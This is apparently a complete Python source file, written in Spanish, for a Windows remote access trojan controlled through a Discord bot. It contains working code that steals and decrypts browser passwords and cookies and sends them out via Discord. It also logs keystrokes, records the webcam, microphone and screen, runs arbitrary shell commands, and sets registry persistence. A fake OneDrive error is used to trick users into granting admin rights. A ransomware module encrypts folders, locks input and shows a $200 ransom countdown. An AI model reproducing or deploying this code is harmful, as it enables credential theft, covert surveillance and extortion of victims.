import discord
from discord.ext import commands
import subprocess
import tempfile
import os
import zipfile
from pynput.keyboard import Key, Listener
import threading
import time
from PIL import ImageGrab
import secrets
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms
from cryptography.hazmat.backends import default_backend
import hmac
import hashlib
import cv2
import pyaudio
import wave
import ctypes
import sys
from tkinter import messagebox
import tkinter as tk

from PySide6.QtWidgets import QApplication, QWidget, QVBoxLayout
from PySide6.QtMultimedia import QMediaPlayer, QAudioOutput
from PySide6.QtMultimediaWidgets import QVideoWidget
from PySide6.QtCore import QUrl, QTimer, Qt, Slot
from pynput.mouse import Controller as MouseController
from pynput.keyboard import Listener as KeyboardListener, Controller as KeyboardController


import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime, timedelta

TOKEN = '<COLOCA TU TOKEN>'
CORRECT_PASSWORD = "Fsociety00"

intents = discord.Intents.default()
intents.message_content = True
intents.messages = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents)

connected_bots = {}

stop_listener = False
authenticated = False
original_wallpaper = None

is_listening = False
audio_stream = None
frames = []

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CheckFailure):
        await ctx.send("🔒 Necesitas autenticarte antes de usar este comando. Usa `!start <contraseña>`.")
    else:
        await ctx.send("Ocurrió un error al ejecutar el comando.")


def run_as_admin():
    """Solicita permisos de administrador y maneja la respuesta del usuario."""
    if not ctypes.windll.shell32.IsUserAnAdmin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
        except Exception as e:
            print(f"No se pudieron obtener permisos de administrador: {e}")
        

def show_error_message():
    """Muestra un cuadro de mensaje de error simulado."""
    root = tk.Tk()
    root.withdraw()
    messagebox.showerror(
        "Error 0x80070005", 
        "OneDrive no puede sincronizar archivos. No se puede completar la sincronización.",
        icon='error'
    )
    run_as_admin()

def run_elevated_command(command):
    """Ejecuta el comando con privilegios de administrador."""
    try:
        subprocess.run(command, shell=True, check=True, creationflags=subprocess.CREATE_NO_WINDOW)
    except subprocess.CalledProcessError as e:
        print(f"Error al ejecutar el comando: {e}")

def on_press(key):
    try:
        with open("registro_teclas.txt", "a") as file:
            file.write(f"{key},")
    except Exception as e:
        print(f"Error: {e}")

def on_release(key):
    global stop_listener
    if key == Key.esc or stop_listener:
        print("Se desactivó el registrador de teclas.")
        return False

def start_keylogger():
    global stop_listener
    stop_listener = False
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

def take_screenshot(output_file):
    screenshot = ImageGrab.grab()
    screenshot.save(output_file)
    return output_file

def generar_hmac(clave_hmac, datos):
    return hmac.new(clave_hmac, datos, hashlib.sha256).digest()

def set_wallpaper(image_path):
    command = f"Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value '{image_path}'; " \
              f"Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper {{ [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }}'; " \
              f"[Wallpaper]::SystemParametersInfo(20, 0, '{image_path}', 3)"
    try:
        subprocess.run(
            ["powershell", "-command", command],
            check=True,
            creationflags=subprocess.CREATE_NO_WINDOW  
        )
    except subprocess.CalledProcessError as e:
        print(f"Error al cambiar el fondo de pantalla: {e}")

original_wallpaper = None

def get_current_wallpaper():
    try:
        result = subprocess.run(
            ["powershell", "-command", "Get-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper | Select-Object -ExpandProperty Wallpaper"],
            check=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW  
        )
        return result.stdout.strip()
    except subprocess.CalledProcessError as e:
        print(f"Error al obtener el fondo de pantalla actual: {e}")
        return None

def start_listening():
    global frames, is_listening, audio_stream

    p = pyaudio.PyAudio()

    stream = p.open(format=pyaudio.paInt16,
                    channels=1,
                    rate=44100,
                    input=True,
                    frames_per_buffer=1024)

    frames = []
    is_listening = True

    while is_listening:
        data = stream.read(1024)
        frames.append(data)

    stream.stop_stream()
    stream.close()
    p.terminate()


@bot.command()
async def start(ctx, password: str):
    global authenticated
    if password == CORRECT_PASSWORD:
        authenticated = True
        available_commands = "\n".join([str(command) for command in bot.commands])
        await ctx.send("Contraseña correcta. Ahora tienes acceso a los comandos.")
        await ctx.send(f"Comandos disponibles:\n{available_commands}")
    else:
        authenticated = False
        await ctx.send("Contraseña incorrecta. No tienes permiso para ejecutar comandos.")

def requires_authentication():
    def predicate(ctx):
        return authenticated
    return commands.check(predicate)



@requires_authentication()
@bot.command()
async def credenciales(ctx, option: str):

    def get_master_key(browser_path):
        try:
            with open(browser_path, "r", encoding='utf-8') as f:
                local_state = f.read()
                local_state = json.loads(local_state)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            return win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
        except:
            return None

    def decrypt_payload(cipher, payload):
        return cipher.decrypt(payload)

    def generate_cipher(aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = generate_cipher(master_key, iv)
            decrypted_pass = decrypt_payload(cipher, payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except:
            return None

    def fetch_passwords(browser_name, db_path, local_state_path):
        passwords = []
        master_key = get_master_key(local_state_path)
        if not master_key:
            return passwords

        try:
            shutil.copy2(db_path, "Loginvault.db")
            conn = sqlite3.connect("Loginvault.db")
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url, username, encrypted_password = row
                password = decrypt_password(encrypted_password, master_key)
                if username or password:
                    passwords.append({"url": url, "username": username, "password": password})
            cursor.close()
            conn.close()
            os.remove("Loginvault.db")
        except:
            pass

        return passwords

    def fetch_cookies(browser_name, cookies_path):
        cookies = []
        try:
            conn = sqlite3.connect(cookies_path)
            cursor = conn.cursor()
            cursor.execute("SELECT host_key, name, path, encrypted_value FROM cookies")
            for row in cursor.fetchall():
                host_key, name, path, encrypted_value = row
                try:
                    decrypted_value = win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1]
                except:
                    decrypted_value = "[ERROR DECRYPTING]"
                cookies.append({"host": host_key, "name": name, "path": path, "value": decrypted_value.decode('utf-8', 'ignore')})
            cursor.close()
            conn.close()
        except:
            pass

        return cookies

    def save_to_file(browser_name, credentials, file_type):
        folder_path = os.path.join("credenciales", browser_name)
        os.makedirs(folder_path, exist_ok=True)

        file_path = os.path.join(folder_path, f"{file_type}.txt")
        with open(file_path, "w", encoding="utf-8") as file:
            for entry in credentials:
                if file_type == "passwords":
                    file.write(f"URL: {entry['url']}\n")
                    file.write(f"Username: {entry['username']}\n")
                    file.write(f"Password: {entry['password']}\n")
                elif file_type == "cookies":
                    file.write(f"Host: {entry['host']}\n")
                    file.write(f"Name: {entry['name']}\n")
                    file.write(f"Path: {entry['path']}\n")
                    file.write(f"Value: {entry['value']}\n")
                file.write("\n")

    try:
        browsers = {
            "Chrome": {
                "passwords_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
                "cookies_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Network", "Cookies"),
                "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data", "Local State")
            },
            "Edge": {
                "passwords_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data"),
                "cookies_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Network", "Cookies"),
                "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data", "Local State")
            },
            "Brave": {
                "passwords_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Login Data"),
                "cookies_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Default", "Network", "Cookies"),
                "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "BraveSoftware", "Brave-Browser", "User Data", "Local State")
            },
            "OperaGX": {
                "passwords_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Login Data"),
                "cookies_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Network", "Cookies"),
                "local_state_path": os.path.join(os.environ["USERPROFILE"], "AppData", "Roaming", "Opera Software", "Opera GX Stable", "Local State")
            }
        }

        for browser, paths in browsers.items():
            if option == "--passwd":
                passwords = fetch_passwords(browser, paths["passwords_path"], paths["local_state_path"])
                save_to_file(browser, passwords, "passwords")
            elif option == "--cookies":
                cookies = fetch_cookies(browser, paths["cookies_path"])
                save_to_file(browser, cookies, "cookies")

        zip_file_path = "credenciales.zip"
        with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk("credenciales"):
                for file in files:
                    file_path = os.path.join(root, file)
                    arcname = os.path.relpath(file_path, "credenciales")
                    zipf.write(file_path, arcname)

        for root, _, files in os.walk("credenciales"):
            for file in files:
                file_path = os.path.join(root, file)
                await ctx.send(file=discord.File(file_path))

        await ctx.send("Aquí están las credenciales extraídas en formato ZIP:", file=discord.File(zip_file_path))

        os.remove(zip_file_path)
        shutil.rmtree("credenciales")

    except Exception as e:
        await ctx.send(f"Ocurrió un error al ejecutar el comando !credenciales: {str(e)}")





@requires_authentication()
@bot.command()
async def kill_bot(ctx):
    """Cerrar el bot especificado"""
    print(f"Bot se está cerrando...")
        
    os._exit(0)  
    ctx.send(f"No se encontró un bot con el nombre {bot_name}.")


@requires_authentication()
@bot.command()
async def ascend(ctx):
    run_as_admin()
    ctx.send("esperando..")
        
@requires_authentication()
@bot.command()
async def error(ctx):
    show_error_message()

@requires_authentication()
@bot.command()
async def listen_start(ctx):
    global is_listening, audio_stream
    if is_listening:
        await ctx.send("Ya estoy escuchando.")
        return

    audio_stream = threading.Thread(target=start_listening)
    audio_stream.start()
    await ctx.send("Escucha iniciada.")

@requires_authentication()
@bot.command()
async def listen_stop(ctx):
    global is_listening, frames

    if not is_listening:
        await ctx.send("No estoy escuchando.")
        return

    is_listening = False
    audio_stream.join()
    file_path = "audio_output.wav"
    wf = wave.open(file_path, 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(pyaudio.PyAudio().get_sample_size(pyaudio.paInt16))
    wf.setframerate(44100)
    wf.writeframes(b''.join(frames))
    wf.close()

    await ctx.send("Enviando el archivo de audio...")
    await ctx.send(file=discord.File(file_path))

    os.remove(file_path)

@requires_authentication()
@bot.command()
async def show_persis(ctx):
    try:
        result = subprocess.run(
            ["reg", "query", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        output = result.stdout
        error = result.stderr

        if output:
            await ctx.send(f"Claves de persistencia:\n```{output}```")
        elif error:
            await ctx.send(f"Error al ejecutar el comando:\n```{error}```")
        else:
            await ctx.send("No se encontraron claves de persistencia.")
    except Exception as e:
        await ctx.send(f"Ocurrió un error: {str(e)}")

@requires_authentication()
@bot.command()
async def kill_persis(ctx, *args):
    try:
        if "-n" in args:
            index = args.index("-n") + 1
            if index < len(args):
                nombre_registro = args[index]

                result = subprocess.run(
                    ["reg", "delete", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "/v", nombre_registro, "/f"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    creationflags=subprocess.CREATE_NO_WINDOW
                )

                output = result.stdout
                error = result.stderr

                if output:
                    await ctx.send(f"Registro eliminado:\n```{output}```")
                elif error:
                    await ctx.send(f"Error al eliminar el registro:\n```{error}```")
                else:
                    await ctx.send(f"No se encontró el registro '{nombre_registro}'.")
            else:
                await ctx.send("Debes proporcionar un nombre de registro después de '-n'.")
        else:
            await ctx.send("Uso: `!kill_persis -n <nombre_del_registro>`")
    except Exception as e:
        await ctx.send(f"Ocurrió un error: {str(e)}")


@requires_authentication()
@bot.command()
async def persiste(ctx, *args):
    try:
        if len(args) < 4:
            await ctx.send("Uso incorrecto. El comando debe ser: !persiste -n <nombre_registro> -x <nombre_del_ejecutable>")
            return
        
        nombre_registro = None
        nombre_del_ejecutable = None
        
        for i in range(len(args)):
            if args[i] == "-n" and i+1 < len(args):
                nombre_registro = args[i+1]
            elif args[i] == "-x" and i+1 < len(args):
                nombre_del_ejecutable = args[i+1]
        
        if not nombre_registro or not nombre_del_ejecutable:
            await ctx.send("Faltan los parámetros. Asegúrate de usar '-n <nombre_registro>' y '-x <nombre_del_ejecutable>'.")
            return
        
        comando = f'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v {nombre_registro} /t REG_SZ /d "{nombre_del_ejecutable}" /f'
        
        subprocess.run(comando, creationflags=subprocess.CREATE_NO_WINDOW, shell=True)
        
        await ctx.send(f"La persistencia para el ejecutable {nombre_del_ejecutable} ha sido configurada correctamente.")
    except Exception as e:
        await ctx.send(f"Ocurrió un error al configurar la persistencia: {str(e)}")

def capturar_imagen():
    camara = cv2.VideoCapture(0)

    if not camara.isOpened():
        raise Exception("No se pudo acceder a la cámara.")

    ret, frame = camara.read()

    if ret:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.jpg') as tmp_file:
            imagen_path = tmp_file.name
            cv2.imwrite(imagen_path, frame)
            return imagen_path
    else:
        raise Exception("Error al capturar la imagen.")

    camara.release()

@requires_authentication()
@bot.command()
async def shoot(ctx):
    try:
        imagen_path = capturar_imagen()
        await ctx.send(file=discord.File(imagen_path))
        os.remove(imagen_path)
        await ctx.send("Imagen enviada y eliminada del sistema.")
    except Exception as e:
        await ctx.send(f"Ocurrió un error al capturar o enviar la imagen: {str(e)}")


class FullScreenVideo(QWidget):
    def __init__(self, video_path):
        super().__init__()
        self.video_path = video_path

        self.setWindowFlags(Qt.FramelessWindowHint | Qt.WindowStaysOnTopHint)
        layout = QVBoxLayout()
        layout.setContentsMargins(0, 0, 0, 0)
        layout.setSpacing(0)
        self.setLayout(layout)

        self.video_widget = QVideoWidget()
        self.video_widget.setStyleSheet("background-color: black;")
        layout.addWidget(self.video_widget)

        self.player = QMediaPlayer()
        self.audio = QAudioOutput()
        self.player.setAudioOutput(self.audio)
        self.player.setVideoOutput(self.video_widget)

        self.player.setSource(QUrl.fromLocalFile(self.video_path))
        self.player.mediaStatusChanged.connect(self.check_loop)

    @Slot()
    def check_loop(self, status):
        if status == QMediaPlayer.EndOfMedia:
            self.player.setPosition(0)
            self.player.play()

    def start(self):
        self.showFullScreen()
        self.player.play()

    def closeEvent(self, event):
        if global_block:
            event.ignore()
        else:
            self.player.stop()
            super().closeEvent(event)


class MouseBlocker:
    def __init__(self):
        self.thread = threading.Thread(target=self.keep_mouse_fixed, daemon=True)
        self.thread.start()

    def keep_mouse_fixed(self):
        mouse = MouseController()
        while global_block:
            mouse.position = (0, 0)

class KeyboardBlocker:
    def __init__(self):
        self.listener = KeyboardListener(on_press=self.block_key)
        self.listener.start()

    def block_key(self, key):
        return False

@requires_authentication()
@bot.command()
async def s4t4n(ctx, op: str, ruta: str, *args):
    """Cifra los archivos de una carpeta y ejecuta una pantalla bloqueada con video."""
    if op != "-c":
        await ctx.send("Uso incorrecto: !s4t4n -c <carpeta> -time <segundos> [--no-video]")
        return

    time_arg = None
    no_video = False
    for i, arg in enumerate(args):
        if arg == "-time" and i + 1 < len(args):
            try:
                time_arg = int(args[i + 1])
            except ValueError:
                await ctx.send("El argumento de tiempo debe ser un número entero.")
                return
        elif arg == "--no-video":
            no_video = True

    if time_arg is None:
        await ctx.send("Debe especificar -time <segundos>.")
        return

    video_path = None
    if not no_video:
        if ctx.message.attachments:
            for attachment in ctx.message.attachments:
                if attachment.filename.lower().endswith((".mp4", ".avi", ".mkv")):
                    upload_folder = "uploads"
                    os.makedirs(upload_folder, exist_ok=True)
                    video_path = os.path.join(upload_folder, attachment.filename)
                    await attachment.save(video_path)
                    break
            if video_path is None:
                await ctx.send("Debe adjuntar un video válido o usar el parámetro --no-video.")
                return
        else:
            await ctx.send("Debe adjuntar un video o usar el parámetro --no-video.")
            return

    await ctx.send("Iniciando cifrado...")

    try:
        clave = os.urandom(32)
        clave_hmac = os.urandom(32)
        nonce = os.urandom(16)

        contador = 0
        inicio = time.time()
        for raiz, _, archivos in os.walk(ruta):
            for archivo in archivos:
                ruta_archivo = os.path.join(raiz, archivo)
                try:
                    with open(ruta_archivo, "rb") as f:
                        datos = f.read()
                    mac = generar_hmac(clave_hmac, datos)
                    cipher = Cipher(algorithms.ChaCha20(clave, nonce), mode=None, backend=default_backend())
                    datos_cifrados = cipher.encryptor().update(datos)
                    with open(ruta_archivo + ".enc", "wb") as f:
                        f.write(nonce + mac + datos_cifrados)
                    os.remove(ruta_archivo)
                    contador += 1
                except Exception as e:
                    print(f"No se pudo cifrar {ruta_archivo}: {e}")
                    continue

        fin = time.time()
        duracion = fin - inicio
        minutos, segundos = divmod(duracion, 60)

        hash_channel = discord.utils.get(ctx.guild.channels, name="hashes")

        await ctx.send(f"Carpeta inicial cifrada: `{ruta}`")
        user_name = os.getlogin()
        if hash_channel:
            await hash_channel.send(f"Llave (clave): `{clave.hex()}`")
            await hash_channel.send(f"Llave HMAC (hash): `{clave_hmac.hex()}`")
            await hash_channel.send(f"usuario {user_name}")
        else:
            await ctx.send("No se encontró el canal 'hashes'. Enviando llaves aquí:")
            await ctx.send(f"Llave (clave): `{clave.hex()}`")
            await ctx.send(f"Llave HMAC (hash): `{clave_hmac.hex()}`")
            await ctx.send(f"usuario {user_name}")

        await ctx.send(f"Duración del cifrado: {int(minutos)} min {segundos:.2f} seg")
        await ctx.send(f"Archivos cifrados: {contador}")
    except Exception as e:
        await ctx.send(f"Error durante el cifrado: {e}")
        return

    if not no_video:
        global global_block
        global_block = True

        app = QApplication.instance()
        if app is None:
            app = QApplication(sys.argv)

        fs_video = None
        try:
            fs_video = FullScreenVideo(video_path)

            MouseBlocker()
            KeyboardBlocker()

            def inject_text_loop():
                kc = KeyboardController()
                while global_block:
                    kc.type("DEDSEC_KRKN")
                    time.sleep(0.5)

            t_inject = threading.Thread(target=inject_text_loop, daemon=True)
            t_inject.start()

            def create_readme():
                """Crea un archivo README.txt en el escritorio."""
                possible_paths = [
                    os.path.join(os.path.expanduser("~"), "Desktop"),
                    os.path.join(os.path.expanduser("~"), "Escritorio"),
                    os.path.join(os.path.expanduser("~"), "OneDrive", "Desktop"),
                    os.path.join(os.path.expanduser("~"), "OneDrive", "Escritorio")
                ]

                desktop = None
                for path in possible_paths:
                    if os.path.exists(path):
                        desktop = path
                        break

                if not desktop:
                    print("No se encontró el escritorio.")
                    return

                readme_path = os.path.join(desktop, "README.txt")
                try:
                    with open(readme_path, "w") as f:
                        f.write("Tus archivos han sido cifrados. Sigue las instrucciones para recuperarlos.")
                except FileNotFoundError as e:
                    print(f"Error creando el README: {e}")

            QTimer.singleShot(5000, create_readme)

            def unlock():
                global global_block
                global_block = False
                if fs_video:
                    fs_video.close()
                app.quit()

            timer = QTimer()
            timer.setSingleShot(True)
            timer.timeout.connect(unlock)
            timer.start(time_arg * 1000)

            fs_video.start()
            app.exec()
        except Exception as e:
            await ctx.send(f"Error en la reproducción del video: {e}")
        finally:
            if fs_video:
                fs_video.close()

    await ctx.send("Proceso completado.")

@bot.command()
async def cronometro(ctx, *args):
    """Muestra un cuadro de diálogo con una cuenta regresiva basada en los parámetros dados.
       Uso: !cronometro -min <minutos> -seg <segundos> -mail <correo>
    """
    minutos = 0
    segundos = 0
    mail = ""
    for i, arg in enumerate(args):
        if arg == "-min" and i + 1 < len(args):
            try:
                minutos = int(args[i + 1])
            except ValueError:
                await ctx.send("El argumento para -min debe ser un número entero.")
                return
        elif arg == "-seg" and i + 1 < len(args):
            try:
                segundos = int(args[i + 1])
            except ValueError:
                await ctx.send("El argumento para -seg debe ser un número entero.")
                return
        elif arg == "-mail" and i + 1 < len(args):
            mail = args[i + 1]

    total_time = minutos * 60 + segundos

    if total_time <= 0:
        await ctx.send("Debe especificar un tiempo válido para el cronómetro.")
        return

    if not mail:
        await ctx.send("Debe especificar un correo con el parámetro -mail.")
        return

    await ctx.send(f"Iniciando cronómetro: {minutos} minutos y {segundos} segundos.")

    def show_countdown():
        import tkinter as tk
        from tkinter import messagebox
        import time

        def countdown():
            nonlocal total_time
            while total_time > 0:
                mins, secs = divmod(total_time, 60)
                timer_label.config(
                    text=(
                        f"{mins:02}:{secs:02}\n\n"
                        f"You are dead security (seguridad muerta / ded security)\n"
                        f"Send a PayPal code for $200, you can buy it on Eneba :D\n"
                        f"For the decryption of encrypted files ;)\n"
                        f"Oops, I forgot to mention: every time you turn off your device,\n"
                        f"1 hour will be deducted from the timer. Once it reaches 0, there will be nothing you can do.\n"
                        f"Contact: {mail}"
                    )
                )
                total_time -= 1
                root.update()
                time.sleep(1)

          
            messagebox.showinfo("Tiempo completado", "El cronómetro ha terminado.")

        def on_close():
            root.destroy()
            show_countdown()  

        root = tk.Tk()
        root.title("Cronómetro")
        root.geometry("600x400")  
        root.configure(bg="black")  
        root.attributes("-topmost", True)
        root.protocol("WM_DELETE_WINDOW", on_close)  

        timer_label = tk.Label(root, text="", font=("Helvetica", 14), justify="center", wraplength=580, bg="black", fg="red")
        timer_label.pack(expand=True, fill="both")

        root.after(100, countdown)
        root.mainloop()

    import threading
    countdown_thread = threading.Thread(target=show_countdown, daemon=True)
    countdown_thread.start()

    await ctx.send("Cronómetro en ejecución.")


@requires_authentication()
@bot.command()
async def Cronos(ctx, op: str, ruta: str, clave: str, clave_hmac: str):
    """Descifra los archivos de una carpeta y envía información al servidor de Discord."""
    if op != "-d":
        await ctx.send("Uso incorrecto: !Cronos -d <carpeta> <clave> <clave_hmac>")
        return

    await ctx.send("Iniciando descifrado...")

    clave_bytes = bytes.fromhex(clave)
    clave_hmac_bytes = bytes.fromhex(clave_hmac)
    contador = 0
    inicio = time.time()
    error_flag = False

    for raiz, _, archivos in os.walk(ruta):
        for archivo in archivos:
            if archivo.endswith(".enc"):
                ruta_archivo = os.path.join(raiz, archivo)
                with open(ruta_archivo, "rb") as f:
                    datos = f.read()
                nonce = datos[:16]
                mac_almacenado = datos[16:48]
                datos_cifrados = datos[48:]
                cipher = Cipher(algorithms.ChaCha20(clave_bytes, nonce), mode=None, backend=default_backend())
                datos_descifrados = cipher.decryptor().update(datos_cifrados)
                mac_calculado = generar_hmac(clave_hmac_bytes, datos_descifrados)

                if mac_calculado != mac_almacenado:
                    error_flag = True
                    break
                with open(ruta_archivo[:-4], "wb") as f:
                    f.write(datos_descifrados)
                os.remove(ruta_archivo)
                contador += 1
        if error_flag:
            break

    fin = time.time()
    duracion = fin - inicio
    minutos, segundos = divmod(duracion, 60)

    if error_flag:
        await ctx.send("❌ Archivo alterado o clave incorrecta")
    else:
        await ctx.send(f"Carpeta inicial descifrada: `{ruta}`")
        await ctx.send(f"Duración del descifrado: {int(minutos)} min {segundos:.2f} seg")
        await ctx.send(f"Archivos descifrados: {contador}")

    global original_wallpaper
    if original_wallpaper and os.path.exists(original_wallpaper):
        set_wallpaper(original_wallpaper)
        await ctx.send("Fondo de pantalla restaurado al original.")
    else:
        await ctx.send("No se pudo restaurar el fondo de pantalla original. El archivo original no existe o no se guardó.")

@bot.command()
@requires_authentication()
async def gameover(ctx):
    global authenticated
    authenticated = False
    await ctx.send("👋 Sesión cerrada correctamente. Debes volver a autenticarte para acceder a los comandos.")

@bot.command()
@requires_authentication()
async def screen(ctx):
    try:
        with tempfile.NamedTemporaryFile(delete=False, suffix='.png') as tmp_file:
            screenshot_path = tmp_file.name

        take_screenshot(screenshot_path)

        await ctx.send(file=discord.File(screenshot_path))

        os.remove(screenshot_path)
        await ctx.send("Captura de pantalla enviada y eliminada del sistema.")
    except Exception as e:
        await ctx.send(f"Ocurrió un error al tomar o enviar la captura de pantalla: {str(e)}")

@bot.event
async def on_ready():
    connected = False
    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send("let's fuck this, un tonto a caído")
                    connected = True
                    break
                except Exception as e:
                    print(f"Error: {e}")
            else:
                print(f"Sin permisos para enviar mensajes en el canal: {channel.name} del servidor {guild.name}")
        if connected:
            break

    if not connected:
        print("No se encontró un canal")

    bot_count = len(connected_bots) + 1
    bot_name = f"bot{bot_count}"
    connected_bots[bot_name] = bot.user.name

    for guild in bot.guilds:
        for channel in guild.text_channels:
            if channel.permissions_for(guild.me).send_messages:
                try:
                    await channel.send(f"Conectado como {bot.user} ({bot_name})")
                    print(f"Enviado al canal {channel.name} del servidor {guild.name}")
                    break  
                except Exception as e:
                    print(f"Error al enviar mensaje: {e}")
                break 

@bot.command()
@requires_authentication()
async def cmd(ctx, *, command: str):
    try:
        process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        output, errors = process.communicate()
        if errors:
            output += '\n' + errors
        if len(output) < 1900:
            await ctx.send(f'```\n{output}\n```')
        else:
            with tempfile.NamedTemporaryFile(delete=False, suffix='.txt', mode='w', encoding='utf-8') as tmp_file:
                tmp_file.write(output)
                tmp_file_path = tmp_file.name
            await ctx.send(file=discord.File(tmp_file_path))
            os.remove(tmp_file_path)
    except Exception as e:
        await ctx.send(f'Ocurrió un error: {str(e)}')

@bot.command()
@requires_authentication()
async def download(ctx, *, path: str):
    if os.path.exists(path):
        if os.path.isfile(path):
            await ctx.send(file=discord.File(path))
        elif os.path.isdir(path):
            zip_temp_path = tempfile.NamedTemporaryFile(delete=False, suffix='.zip').name
            with zipfile.ZipFile(zip_temp_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
                for foldername, subfolders, filenames in os.walk(path):
                    for filename in filenames:
                        file_path = os.path.join(foldername, filename)
                        zip_file.write(file_path, os.path.relpath(file_path, path))

            zip_size = os.path.getsize(zip_temp_path)
            max_size = 8 * 1024 * 1024
            if zip_size <= max_size:
                await ctx.send(file=discord.File(zip_temp_path))
            else:
                await ctx.send("El archivo es demasiado grande para enviarlo como un zip. Usa !forceDownload para enviarlo individualmente.")
            os.remove(zip_temp_path)
    else:
        await ctx.send("La ruta especificada no existe.")

@bot.command()
@requires_authentication()
async def forceDownload(ctx, *, path: str):
    if os.path.exists(path):
        if os.path.isdir(path):
            for filename in os.listdir(path):
                file_path = os.path.join(path, filename)
                await ctx.send(file=discord.File(file_path))
        else:
            await ctx.send("La ruta especificada no es una carpeta.")
    else:
        await ctx.send("La ruta especificada no existe.")

@bot.command()
@requires_authentication()
async def upload(ctx):
    if not os.path.exists("uploads"):
        os.makedirs("uploads")

    if ctx.message.attachments:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join("uploads", attachment.filename)
        try:
            await attachment.save(file_path)
            await ctx.send(f"Archivo guardado: {file_path}")
        except Exception as e:
            await ctx.send(f"Ocurrió un error al guardar el archivo: {str(e)}")
    else:
        await ctx.send("No se adjuntó ningún archivo.")

@bot.command()
@requires_authentication()
@commands.has_permissions(manage_messages=True)
async def kill(ctx):
    await ctx.send("Eliminando todos los mensajes...")
    messages_to_delete = []
    async for message in ctx.channel.history(limit=None):
        if (ctx.message.created_at - message.created_at).days < 14:
            messages_to_delete.append(message)

    while messages_to_delete:
        to_delete = messages_to_delete[:100]
        await ctx.channel.delete_messages(to_delete)
        messages_to_delete = messages_to_delete[100:]

    await ctx.send("Todos los mensajes han sido eliminados.")

@bot.command()
@requires_authentication()
async def keyStart(ctx):
    await ctx.send("Iniciando el registro de teclas...")
    threading.Thread(target=start_keylogger, daemon=True).start()

@bot.command()
@requires_authentication()
async def keyStop(ctx):
    global stop_listener
    stop_listener = True
    await ctx.send("Deteniendo el registro de teclas...")
    await ctx.send("Enviando el archivo con el registro de teclas...")
    if os.path.exists("registro_teclas.txt"):
        await ctx.send(file=discord.File("registro_teclas.txt"))
        os.remove("registro_teclas.txt")
    else:
        await ctx.send("No se encontró el archivo de registro de teclas.")


@bot.command()
@requires_authentication()
async def scare(ctx):
    upload_folder = "uploads"
    if not os.path.exists(upload_folder):
        os.makedirs(upload_folder)

    if ctx.message.attachments:
        for attachment in ctx.message.attachments:
            if attachment.filename.lower().endswith(('.png', '.jpg', '.jpeg')):
                image_path = os.path.join(upload_folder, attachment.filename)
                await attachment.save(image_path)
                command = f"Set-ItemProperty -Path 'HKCU:\\Control Panel\\Desktop' -Name Wallpaper -Value '{os.path.abspath(image_path)}'; " \
                          f"Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper {{ [DllImport(\"user32.dll\")] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }}'; " \
                          f"[Wallpaper]::SystemParametersInfo(20, 0, '{os.path.abspath(image_path)}', 3)"

                try:
                    subprocess.run(
                        ["powershell", "-command", command],
                        check=True,
                        creationflags=subprocess.CREATE_NO_WINDOW
                    )
                    await ctx.send(f'Fondo de pantalla cambiado por {attachment.filename}.')
                except subprocess.CalledProcessError as e:
                    await ctx.send(f"Error al cambiar el fondo de pantalla: {e}")
                return
            else:
                await ctx.send("El archivo adjunto debe ser una imagen JPG o PNG.")
